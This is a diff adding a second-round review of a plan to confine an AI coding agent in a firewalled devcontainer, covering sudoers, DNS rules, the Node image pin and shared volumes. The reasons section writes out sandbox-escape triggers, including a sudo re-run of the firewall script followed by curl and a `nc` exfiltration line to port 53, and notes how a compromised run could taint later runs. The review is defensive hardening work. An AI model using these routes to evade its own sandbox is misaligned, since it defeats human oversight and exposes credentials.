@@ -94,3 +94,105 @@ joins project `level-up-lab`, so a `docker compose up -d --remove-orphans` from 
 and a `shutdownAction: stopCompose` in the new `devcontainer.json` would stop the shared Postgres. Settle both in the
 diff. The plan's claim that `--disallowedTools` still holds under `bypassPermissions` has no probe. The init check
 and `--check-binary` (run under the chosen mode) cover hooks only.
+
+## Plan review (round 2)
+
+SCOPE: tooling (no §; `.devcontainer/runner/`, `scripts/agent/`, `scripts/ci/lib.sh`). Plan at `0f0beac` (77 lines).
+Read: cards B1.58 and B1.59, round 1 above, `run.sh`, `run-smoke.sh`, `tier.sh`, `tier-smoke.sh`, `scripts/ci/lib.sh`,
+`check-config-change.sh`, `next-task.sh` (claim), `.devcontainer/*`, `docker-compose.yml`, `compose-smoke.sh`,
+`worktree.sh` (install step), `package.json`, D-19, D-27, D-28.
+
+Probes run (read-only, nothing on the tree):
+
+- `scripts/next-task.sh --check B1.58` → `[next-task] B1.58: no overlap with any Doing or Review card` (exit 0)
+- `scripts/agent/tier.sh backlog/work/B1.58/plan.md` → `high`; `plan-files.sh --file` → 11 tokens, all in the table
+- `pnpm test` → `Tests 202 passed (202)` (the plan's number holds); `run-smoke.sh` → `14 probes OK`;
+  `tier-smoke.sh` → `9 probes OK`
+- `npm view @anthropic-ai/claude-code time`: 2.1.303 2026-10-18 (15 days), 2.1.304 2026-10-19 (14 days)
+- `nodejs.org/dist/index.json`: v24.22.0 2026-10-14 `security=false`, **v24.22.1 2026-10-20 `security=true`**,
+  v24.22.2 2026-10-27
+- Docker Hub `library/node` tags: `24.22.0-bookworm` `tag_last_pushed` **2026-10-21T05:41Z** (12 days);
+  `24.22.1-bookworm` re-pushed 2026-10-28
+- `worktree.sh:101` runs `pnpm install --frozen-lockfile`; `package.json` builds `@prisma/engines` and `prisma`
+  (`onlyBuiltDependencies`), Prisma 6.19.3
+
+Round 1 reasons:
+
+| r1  | Status in round 2                                                                                                                                               |
+| --- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| 1   | addressed. A separate project with no Postgres; S1 refuses `host.docker.internal:5433`, S7 finds no `postgres` host                                             |
+| 2   | addressed. `runner-pnpm-store` in project `level-up-lab-runner`, no volume shared with `app`; the orphan and `stopCompose` notes are moot                       |
+| 3   | addressed. Costs says the login and the gh token are readable and can be published through the public repo; mitigation is revocation                            |
+| 4   | addressed. `\.devcontainer/.*` in `CONFIG_PROTECTED`, T3 probe. D-28 names "the protected list", so this extends it without a new D-n                           |
+| 5   | (b) and (c) addressed (S4 curl shim both ways, R15 uname shim; ip6tables DROP, S1 `-6`). (a) half: S5 adds `sudo -n` but not the re-run or arguments (reason 1) |
+| 6   | stated as deviations, but the Node pin's facts do not hold (reason 3)                                                                                           |
+| 7   | addressed: volumes listed, `pnpm test` 202. The "gains nothing" sentence overstates (reason 5)                                                                  |
+
+| Check                                                                | Result                                                                                                                                      |
+| -------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
+| every file belongs to the card                                       | pass. 4 new `.devcontainer/runner/*`, 4 `scripts/agent/*`, `scripts/ci/lib.sh`, `scripts/CLAUDE.md`, work files; none is B1.55's or B1.49's |
+| interfaces follow `ts-style.md`; mutations in actions; Prisma in lib | n/a (no `src/`). `--mode`, S1–S7 and the compose command pasted                                                                             |
+| follows `advice.md` or states the deviation                          | pass. "Advisor skipped (tier quick)"; the `claude-code-vm` deviation is stated                                                              |
+| ≤ 7 criteria, measurable Thens                                       | pass. 4 Acceptance clauses mapped to S1–S7, R15, T3. Two costs still understated (reasons 4, 5)                                             |
+| verification: exact commands, expected numbers                       | pass with a gap. 15/15, 9/9, 202, 6/6, 7/7. `devcontainer.json` is never exercised (reason 6)                                               |
+| skeleton → red → green → map → review                                | pass for tooling, as B1.44: red `test(scripts)`, green `chore(scripts)`, review `docs(backlog)`                                             |
+| `Lead approves spec` box                                             | n/a (no section). `Plan approved by:` empty; I write neither                                                                                |
+| no settled D-n contradicted                                          | pass. D-19 label named, D-28 high matches `tier.sh`                                                                                         |
+| `next-task.sh --check B1.58`                                         | pass: "B1.58: no overlap with any Doing or Review card"                                                                                     |
+
+Verdict: changes requested
+
+1. **The firewall script stays runnable by the run, and only its start is probed** (r1 5(a) residue; the gap is
+   confirmed in the plan text, the open window is plausible). "sudoers 1 cmd" leaves
+   `node NOPASSWD: init-firewall.sh` in place after start, so a `bypassPermissions` run can call it again at any
+   time. Trigger: `sudo -n /usr/local/bin/init-firewall.sh & sleep 0.5; curl https://example.com`. A script that
+   resets policies to ACCEPT before it flushes and fetches `api.github.com/meta` opens egress for that window. A
+   script that keeps DROP fails on the fetch and leaves the container with no allow rules. S5 tests neither case,
+   and the round 1 ask that the script take no arguments or environment that change its rules is not in the plan.
+   Fix, either: (a) no sudo in the image; the start command runs as root, applies the firewall, then drops to
+   `node` with `setpriv`, and the lead and B1.59 enter with `docker exec -u node`. Or (b) a sudoers entry with
+   `""` (no arguments), and a first line that refuses a second run before any flush (a root-owned mark in `/run`).
+   Either way S5 must add: a second `sudo -n init-firewall.sh` (or "sudo absent") leaves example.com refused and
+   api.github.com reachable, checked both during the call and after it.
+2. **"DNS stays open" does not name a destination** (plausible). The common pattern, Anthropic's reference script
+   included, is `-p udp --dport 53 -j ACCEPT` with no `-d`. That rule is a raw UDP (or TCP) channel to any IP on
+   port 53, not only DNS. Trigger: `printf data | nc -u -w1 <any IP> 53` leaves the container. On the compose
+   network the resolver is `127.0.0.11`, which is loopback, so no external rule for 53 is needed. Fix: allow 53 only
+   to `127.0.0.11`, and add to S1 that `dig @1.1.1.1 example.com` is refused. Then Costs can say exactly what stays
+   open: tunnelling through Docker's resolver.
+3. **The Node pin skips a security release, and the tag is younger than two weeks** (confirmed). v24.22.1
+   (2026-10-20, 13 days old) is flagged `security=true` in nodejs.org's index. The pinned v24.22.0 lacks those
+   fixes, and the plan does not say so. The tag `node:24.22.0-bookworm` was last pushed on 2026-10-21, so the bits
+   it serves today are 12 days old, not the 19 the plan implies, and Docker re-pushes these tags. Fix: pin by digest
+   (`node:24.22.0-bookworm@sha256:…`) with the digest's push date, and put in decision 2, for the lead: "24.22.1 is a
+   security release 13 days old; the 14-day rule keeps it out until 2026-11-03". Either take 24.22.1 on that date or
+   accept the gap. Also, for the lead: bookworm's `gh` 2.23 is from 2023.
+4. **The full issue run is deferred to a card that does not hold it** (the card text is confirmed; the install
+   failure is plausible). The plan says Prisma engines and Playwright are "B1.59's". B1.59's Acceptance is a
+   launchd plist that runs `run.sh --poll` inside this container. It names no wider allow list and no offline cache.
+   Trigger: any `run.sh <issue>` inside → `worktree.sh:101` `pnpm install` → `@prisma/engines`' build fetches from
+   `binaries.prisma.sh`, which is refused. So once B1.59 lands, every unattended tick fails at setup. Fix: name the
+   card that widens the list or adds the cache (amend B1.59 through the filing lane, or file a new card that B1.59
+   depends on), and say in Costs that after B1.58 only `--check-binary` works inside.
+5. **Decision 1's costs are not all stated** (plausible). (a) The host and the container each keep their own
+   `RUNS` (locks, `stopped` marks) and their own local branches. `next-task.sh --claim` and `in_flight` see the other
+   side only after a push or a PR. Until B1.59 the lead can start the same issue on both sides, which gives two
+   runs and two `chore/<card>-agent` branches racing to reach origin. (b) "It gains nothing the firewall does not
+   still bound" is too strong. The volumes carry a run's writes into every later run: the clone's `.git/hooks` and
+   `.git/config` are shared by every later worktree, `verified-versions` is in `runner-runs`, and user-level files
+   are in `runner-claude`. So one compromised run can taint the branches of later runs until the volumes are wiped.
+   The firewall bounds destinations, not the integrity of later PRs. State both, or recreate `runner-repo` for each
+   run.
+6. **`devcontainer.json` is in Files but no Verification step uses it** (plausible). The lead's steps use the
+   compose `up` command. If the lead opens the runner from VS Code, its server and extension downloads go to hosts
+   the allow list refuses (`update.code.visualstudio.com`, `marketplace.visualstudio.com`, `*.vscode-cdn.net`). The
+   firewall is already up when VS Code attaches, so the attach can fail. Fix: drop the file (the compose project
+   meets the Acceptance), or add an "open in VS Code" step with its expected result and state any host it needs.
+
+Not blocking, for the lead: the plan is 77 lines against planning.md's ≈ 40. The red runs on the host, while the
+card says "from the container today"; the host is a stricter red, but say so. Set `CLAUDE_CONFIG_DIR` to the
+mounted dir so that `~/.claude.json` persists with the credentials. The `uname` conjunct of `sandboxed()` has no
+probe that tells it apart, because the marker already fails on the host; that is redundancy, not a gap.
+`--disallowedTools` under `bypassPermissions` stays [unverified], as the plan says. Per the reviewer's rules, a
+third round goes to "Waiting on human": each reason above is a stated cost or a one-line fix that the lead can settle
+at the gate.
